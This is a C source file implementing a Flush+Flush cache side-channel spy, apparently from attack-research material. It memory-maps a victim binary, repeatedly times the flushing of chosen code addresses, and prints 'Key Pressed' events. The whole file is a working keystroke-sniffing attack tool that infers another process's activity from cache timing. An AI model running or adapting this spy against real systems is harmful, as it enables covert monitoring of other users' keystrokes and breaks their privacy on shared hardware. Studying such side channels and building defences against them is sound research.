
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <stdint.h>
#include "../../cacheutils.h"

// Adjust this number for your machine. it is the threshold between hit and miss.
#define MIN_HIT (105)

char event[64][1024];
unsigned int offset[1024];
int event_count = 0;

size_t kpause = 0;
void flushandflush(void* addr, char* event)
{
  //Flush and time measurement
  size_t time = rdtsc();
  flush(addr);
  size_t delta = rdtsc() - time;

  if (delta > MIN_HIT)
  {
    // We do not want to monitor the same Cache hit twice. hence we are creating a "delay" between cache hits (based on the fact you don't type faster than the computer
    // "delay" between cache hits (based on the fact you don't type faster than the computer)
    if (kpause > 1000) 
    {
      printf("%lu: Key Pressed: %s (%lu cycles) after a pause of %lu cycles\n", time, event, delta, kpause);
    }
    kpause = 0;
  }
  else
    kpause++;
}

int main(int argc, char** argv)
{
  if (argc != 2)
  {    
    printf("usage: ./spy <victim binary>\n");
    printf("usage: pass sorted address list to stdin in format: void*,char[64]\n");
    return 1;
  }
  char* name = argv[1];

  //Recieve memory adress and keys associated with it via stdin
  while (scanf("%p,%s\n",(void**)&offset[event_count],event[event_count]) > 0)
  {
    printf("Monitor address %d for event %s\n",offset[event_count],event[event_count]);
    ++event_count;
  }

  //Open the file we want to monitor
  int fd = open(name,O_RDONLY);
  if (fd < 3)
  {
    printf("error: failed to open file\n");
    return 2;
  }

  //Map the file to virtual memory
  unsigned char* addr = (unsigned char*)mmap(0, 64*1024*1024, PROT_READ, MAP_SHARED, fd, 0);
  if (addr == (void*)-1 || addr == (void*)0)
  {
    printf("error: failed to mmap\n");
    return 2;
  }

  //Execute Flush&Flush forever on the attacked process
  while(1)
  {
    for (int i = 0; i < event_count; ++i)
      flushandflush(addr + offset[i],event[i]);
    for (int i = 0; i < 3; ++i)
      sched_yield();
  }
  return 0;
}
